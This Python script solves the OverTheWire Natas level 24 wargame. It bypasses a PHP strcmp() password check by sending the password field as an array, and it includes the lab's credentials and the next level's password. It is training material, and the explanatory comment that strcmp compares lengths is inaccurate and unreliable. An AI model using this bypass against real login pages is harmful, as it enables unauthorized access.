#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas24"
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

post_data = {"passwd[]": "100iloveyou"}

response = session.post(url, data=post_data, auth=(username, password))
content = response.text

soup = BeautifulSoup(content, "html.parser").prettify()

print(soup)
print("=" * 80)


# this time we got an /index-source.html
# this times the site chooses strcmp(), which is php
# function, to determine if we had entered the correct password
# or not and this to the problem idea as strcmp($val1, $val2) returns:
#   -> '>0' if $val1 is greater than $val2
#   -> '<0' if $val1 is less than $val2
#   -> '=0' if $val1 is equal than $val2
# which seems that just compares the length of the two values like what (===)
# but if $val1 is of type string and $val2 is an array(), this should give an error
# and that isn't handled correctly in this level
#
# we got it right:
# Username: natas25
# Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
